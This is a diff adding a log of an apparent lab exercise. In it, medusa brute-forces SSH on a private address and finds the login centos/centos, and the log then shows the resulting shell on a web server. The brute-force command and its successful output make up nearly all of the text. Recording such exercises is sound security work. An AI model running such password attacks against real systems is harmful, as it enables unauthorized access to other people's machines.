@@ -1,0 +1,24 @@
+########################KALI########################################################
+└─$ medusa -h 10.4.2.173 -u centos -P /usr/share/sqlmap/data/txt/testing.txt -M ssh -n 22
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [ssh] Host: 10.4.2.173 (1 of 1, 0 complete) User: centos (1 of 1, 0 complete) Password: hfdsalf (1 of 8 complete)
+ACCOUNT CHECK: [ssh] Host: 10.4.2.173 (1 of 1, 0 complete) User: centos (1 of 1, 0 complete) Password: jflkdshalf (2 of 8 complete)
+ACCOUNT CHECK: [ssh] Host: 10.4.2.173 (1 of 1, 0 complete) User: centos (1 of 1, 0 complete) Password: vklchsd (3 of 8 complete)
+ACCOUNT CHECK: [ssh] Host: 10.4.2.173 (1 of 1, 0 complete) User: centos (1 of 1, 0 complete) Password: fhjlksdavf (4 of 8 complete)
+ACCOUNT CHECK: [ssh] Host: 10.4.2.173 (1 of 1, 0 complete) User: centos (1 of 1, 0 complete) Password: hklvh (5 of 8 complete)
+ACCOUNT CHECK: [ssh] Host: 10.4.2.173 (1 of 1, 0 complete) User: centos (1 of 1, 0 complete) Password: hkflasdh (6 of 8 complete)
+ACCOUNT CHECK: [ssh] Host: 10.4.2.173 (1 of 1, 0 complete) User: centos (1 of 1, 0 complete) Password: hfklasdhf (7 of 8 complete)
+ACCOUNT CHECK: [ssh] Host: 10.4.2.173 (1 of 1, 0 complete) User: centos (1 of 1, 0 complete) Password: centos (8 of 8 complete)
+ACCOUNT FOUND: [ssh] Host: 10.4.2.173 User: centos Password: centos [SUCCESS]
+####################################################################################
+
+###############################WEB SERVER###########################################
+centos@10.4.2.173's password:
+Last failed login: Mon Nov 27 11:52:01 CET 2023 from 10.4.2.174 on ssh:notty
+There were 68 failed login attempts since the last successful login.
+Last login: Mon Nov 20 15:32:31 2023 from 10.4.2.174
+-bash: TMOUT: readonly variable
+-bash: TMOUT: readonly variable
+[centos@localhost ~]$
+#####################################################################################
